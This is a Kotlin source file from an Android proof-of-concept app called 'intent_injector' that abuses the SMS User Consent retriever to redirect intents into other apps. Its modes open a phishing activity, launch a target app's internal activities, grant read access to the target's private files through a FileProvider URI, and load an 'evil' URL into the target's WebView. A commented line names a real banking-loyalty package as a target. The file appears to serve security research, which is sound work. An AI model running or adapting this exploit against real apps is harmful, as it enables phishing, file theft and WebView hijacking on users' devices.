package bar.gtfo.intent_injector.intent

import android.content.BroadcastReceiver
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import com.google.android.gms.auth.api.phone.SmsRetriever

private const val FISHING_ACTIVITY = "bar.gtfo.intent_injector.PhishingActivity"
private const val PACKAGE_NAME = "bar.gtfo.intent_injector"
private const val MALICIOUS_URL = "https://evil.gtfo.bar"

class IntentManager(private val mainActivity: ComponentActivity) {

    enum class Mode {
        PHISHING, ACTIVITY, TOAST, NONE, PROXY, FILEPROVIDER, WEBVIEW
    }

    private val intentListener = IntentListener(this)
    private val intentSender = IntentSender(mainActivity)

    private lateinit var targetPackageName: String
    private lateinit var targetClassName: String
    private lateinit var targetFileName: String

    private var mode: Mode = Mode.PHISHING

    fun startListenToSms() {
        val task = SmsRetriever.getClient(mainActivity).startSmsUserConsent(null)
        registerReceiver(intentListener)
        Log.i(mainActivity.packageName, task.toString())
    }

    private fun stopListenToSms() {
        mainActivity.unregisterReceiver(intentListener)
    }

    fun setTarget(packageName: String, className: String, fileName: String) {
        targetPackageName = packageName
        targetClassName = className
        targetFileName = fileName
    }

    fun injectAccordingToMode() {
        when (mode) {
            Mode.PHISHING -> fishingIntent().let {
                intentSender.inject(it)
            }

            Mode.ACTIVITY -> activityIntent(targetPackageName, targetClassName).let {
                intentSender.inject(it)
            }

            Mode.FILEPROVIDER -> fileProviderIntent(
                "content://${targetPackageName}/files/${targetFileName}"
            ).let {
                intentSender.inject(it)
            }

            Mode.WEBVIEW -> urlIntent(MALICIOUS_URL).let {
                intentSender.inject(it)
            }

            else -> Toast.makeText(mainActivity, "Wrong mode", Toast.LENGTH_LONG).show()
        }
    }

    fun onSmsReceived(intent: Intent) {
        stopListenToSms()
        when (mode) {
            Mode.NONE -> {}
            Mode.PROXY -> intentSender.proxySmsRetreiverIntent(intent)
            Mode.TOAST -> Toast.makeText(mainActivity, intent.toString(), Toast.LENGTH_LONG).show()
            //3 -> startInternalActivity("ru.nspk.mir.loyalty","com.google.android.play.core.missingsplits.PlayCoreMissingSplitsActivity")
            else -> injectAccordingToMode()
        }
    }

    private fun fishingIntent() : Intent {
        return activityIntent(PACKAGE_NAME, FISHING_ACTIVITY)
    }

    private fun activityIntent(className: String, packageName: String) : Intent {
        return Intent().apply {
            setClassName(className, packageName)
        }
    }

    private fun fileProviderIntent(uri: String) : Intent {
        return fishingIntent().apply {
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
            data = Uri.parse(uri)
        }
    }

    private fun urlIntent(url: String) : Intent {
        return activityIntent(targetClassName, targetPackageName).apply {
            data = Uri.parse(url)
        }
    }

    fun setMode(newMode: Mode) {
        mode = newMode
    }

    private fun registerReceiver(receiver: BroadcastReceiver) {
        val intentFilter = IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION)
        mainActivity.registerReceiver(receiver, intentFilter)
    }

}
